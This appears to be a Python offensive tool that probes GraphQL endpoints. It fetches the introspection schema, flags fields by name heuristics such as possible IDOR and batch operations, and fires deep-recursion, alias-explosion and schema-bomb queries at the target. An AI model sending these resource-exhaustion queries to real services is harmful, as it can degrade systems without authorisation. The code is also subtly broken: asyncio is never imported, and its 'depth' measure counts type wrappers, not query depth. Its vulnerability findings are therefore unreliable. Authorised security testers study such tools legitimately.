#!/usr/bin/env python3
"""
GRAPHQL AST HACKER
Advanced GraphQL exploitation using Abstract Syntax Tree manipulation.
Finds vulnerabilities in GraphQL implementations through schema analysis and AST attacks.
"""

import json
import re
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass
import aiohttp
from graphql import build_ast_schema, parse, print_ast
from graphql.language.ast import DocumentNode

@dataclass
class GraphQLVulnerability:
    type: str
    severity: str
    description: str
    location: str
    payload: Optional[str] = None
    impact: Optional[str] = None

class GraphQLASTHacker:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.schema = None
        self.introspection_data = None
        self.vulnerabilities: List[GraphQLVulnerability] = []
        
    async def fetch_introspection(self) -> bool:
        """Fetch GraphQL introspection schema."""
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Arachne-GraphQL-Hacker/2.0'
        }
        
        payload = {
            'query': introspection_query,
            'variables': None,
            'operationName': 'IntrospectionQuery'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.target_url,
                    json=payload,
                    headers=headers,
                    timeout=30
                ) as response:
                    
                    if response.status == 200:
                        self.introspection_data = await response.json()
                        return True
                    else:
                        print(f"Introspection failed: {response.status}")
                        return False
                        
        except Exception as e:
            print(f"Error fetching introspection: {e}")
            return False
    
    def analyze_schema(self):
        """Analyze GraphQL schema for vulnerabilities."""
        if not self.introspection_data:
            print("No introspection data available")
            return
        
        schema = self.introspection_data.get('data', {}).get('__schema', {})
        types = schema.get('types', [])
        
        # Check for excessive depth
        self._check_query_depth(types)
        
        # Check for expensive fields
        self._check_expensive_fields(types)
        
        # Check for IDOR patterns
        self._check_idor_patterns(types)
        
        # Check for batch operations
        self._check_batch_operations(types)
        
        # Check for introspection exposure
        self._check_introspection_exposure()
    
    def _check_query_depth(self, types: List[Dict]):
        """Check for query depth vulnerabilities."""
        for type_info in types:
            if type_info.get('kind') == 'OBJECT' and type_info.get('name') == 'Query':
                fields = type_info.get('fields', [])
                
                for field in fields:
                    field_type = field.get('type', {})
                    depth = self._calculate_type_depth(field_type)
                    
                    if depth > 5:
                        self.vulnerabilities.append(
                            GraphQLVulnerability(
                                type="Deep Query Chain",
                                severity="MEDIUM",
                                description=f"Field '{field['name']}' has depth {depth}",
                                location=f"Query.{field['name']}",
                                impact="Potential for resource exhaustion"
                            )
                        )
    
    def _calculate_type_depth(self, type_info: Dict, current_depth: int = 0) -> int:
        """Calculate depth of a GraphQL type."""
        if not type_info:
            return current_depth
        
        of_type = type_info.get('ofType')
        if of_type:
            return self._calculate_type_depth(of_type, current_depth + 1)
        
        return current_depth
    
    def _check_expensive_fields(self, types: List[Dict]):
        """Check for potentially expensive fields."""
        expensive_patterns = [
            'all', 'list', 'search', 'find', 'getAll', 'every'
        ]
        
        for type_info in types:
            if type_info.get('kind') == 'OBJECT':
                fields = type_info.get('fields', [])
                
                for field in fields:
                    field_name = field.get('name', '').lower()
                    
                    for pattern in expensive_patterns:
                        if pattern in field_name:
                            self.vulnerabilities.append(
                                GraphQLVulnerability(
                                    type="Potentially Expensive Field",
                                    severity="LOW",
                                    description=f"Field '{field['name']}' matches expensive pattern '{pattern}'",
                                    location=f"{type_info['name']}.{field['name']}",
                                    impact="May cause performance issues"
                                )
                            )
    
    def _check_idor_patterns(self, types: List[Dict]):
        """Check for IDOR (Insecure Direct Object Reference) patterns."""
        idor_patterns = [
            ('user', 'id'),
            ('account', 'id'),
            ('profile', 'id'),
            ('document', 'id'),
            ('file', 'id')
        ]
        
        for type_info in types:
            if type_info.get('kind') == 'OBJECT':
                type_name = type_info.get('name', '').lower()
                fields = type_info.get('fields', [])
                
                for field in fields:
                    field_name = field.get('name', '').lower()
                    
                    for pattern, id_field in idor_patterns:
                        if pattern in type_name and 'id' in field_name:
                            # Check if this field takes an ID parameter
                            args = field.get('args', [])
                            for arg in args:
                                if arg.get('name') == id_field:
                                    self.vulnerabilities.append(
                                        GraphQLVulnerability(
                                            type="Potential IDOR",
                                            severity="HIGH",
                                            description=f"Field '{field['name']}' takes {id_field} parameter",
                                            location=f"{type_info['name']}.{field['name']}({id_field}: ID)",
                                            impact="Possible insecure direct object reference"
                                        )
                                    )
    
    def _check_batch_operations(self, types: List[Dict]):
        """Check for batch operation vulnerabilities."""
        batch_patterns = [
            'batch', 'bulk', 'multiple', 'mass', 'all'
        ]
        
        for type_info in types:
            if type_info.get('kind') == 'OBJECT':
                fields = type_info.get('fields', [])
                
                for field in fields:
                    field_name = field.get('name', '').lower()
                    
                    for pattern in batch_patterns:
                        if pattern in field_name:
                            # Check if it takes a list/array input
                            args = field.get('args', [])
                            for arg in args:
                                arg_type = arg.get('type', {})
                                if self._is_list_type(arg_type):
                                    self.vulnerabilities.append(
                                        GraphQLVulnerability(
                                            type="Batch Operation",
                                            severity="MEDIUM",
                                            description=f"Field '{field['name']}' processes multiple items",
                                            location=f"{type_info['name']}.{field['name']}",
                                            impact="Potential for mass assignment or DoS"
                                        )
                                    )
    
    def _is_list_type(self, type_info: Dict) -> bool:
        """Check if a type is a list/array."""
        if type_info.get('kind') == 'LIST':
            return True
        
        of_type = type_info.get('ofType')
        if of_type:
            return self._is_list_type(of_type)
        
        return False
    
    def _check_introspection_exposure(self):
        """Check if introspection is enabled."""
        if self.introspection_data:
            self.vulnerabilities.append(
                GraphQLVulnerability(
                    type="Introspection Enabled",
                    severity="INFO",
                    description="GraphQL introspection is accessible",
                    location="/graphql endpoint",
                    impact="Information disclosure about API schema"
                )
            )
    
    def generate_malicious_queries(self) -> List[str]:
        """Generate malicious GraphQL queries for testing."""
        malicious_queries = []
        
        # Deep recursion query
        deep_query = """
        query DeepAttack {
          user(id: "1") {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        malicious_queries.append(deep_query)
        
        # Alias explosion attack
        alias_query = "query AliasAttack {"
        for i in range(100):
            alias_query += f'\n  alias{i}: __typename'
        alias_query += "\n}"
        malicious_queries.append(alias_query)
        
        # Field duplication attack
        field_query = """
        query FieldBomb {
          __schema {
            types {
              name
              fields {
                name
                type { name }
                args {
                  name
                  type { name }
                }
              }
            }
          }
        }
        """
        malicious_queries.append(field_query)
        
        return malicious_queries
    
    async def test_queries(self, queries: List[str]) -> List[Dict]:
        """Test malicious queries against the target."""
        results = []
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Arachne-GraphQL-Tester/2.0'
        }
        
        for i, query in enumerate(queries[:5]):  # Limit to 5 queries
            payload = {
                'query': query,
                'variables': None
            }
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        self.target_url,
                        json=payload,
                        headers=headers,
                        timeout=30
                    ) as response:
                        
                        result = {
                            'query_number': i + 1,
                            'status': response.status,
                            'time_taken': response.headers.get('x-response-time', 'N/A'),
                            'size': len(await response.text()) if response.status == 200 else 0
                        }
                        results.append(result)
                        
            except Exception as e:
                results.append({
                    'query_number': i + 1,
                    'error': str(e)
                })
        
        return results
    
    def get_report(self) -> str:
        """Generate vulnerability report."""
        if not self.vulnerabilities:
            return "No vulnerabilities found"
        
        report_lines = [
            "# GraphQL Security Assessment",
            f"Target: {self.target_url}",
            f"Vulnerabilities found: {len(self.vulnerabilities)}",
            "\n## Findings:"
        ]
        
        # Group by severity
        by_severity = {}
        for vuln in self.vulnerabilities:
            by_severity.setdefault(vuln.severity, []).append(vuln)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                report_lines.append(f"\n### {severity}")
                for vuln in by_severity[severity]:
                    report_lines.append(f"- **{vuln.type}**")
                    report_lines.append(f"  Location: {vuln.location}")
                    report_lines.append(f"  Description: {vuln.description}")
                    if vuln.impact:
                        report_lines.append(f"  Impact: {vuln.impact}")
        
        return "\n".join(report_lines)

# Example usage
async def main():
    hacker = GraphQLASTHacker("https://example.com/graphql")
    
    # Fetch and analyze schema
    if await hacker.fetch_introspection():
        hacker.analyze_schema()
        
        # Generate and test malicious queries
        malicious_queries = hacker.generate_malicious_queries()
        test_results = await hacker.test_queries(malicious_queries)
        
        # Print report
        print(hacker.get_report())
        
        # Print test results
        print("\n## Query Test Results:")
        for result in test_results:
            print(f"Query {result.get('query_number')}: Status {result.get('status')}")

if __name__ == "__main__":
    asyncio.run(main())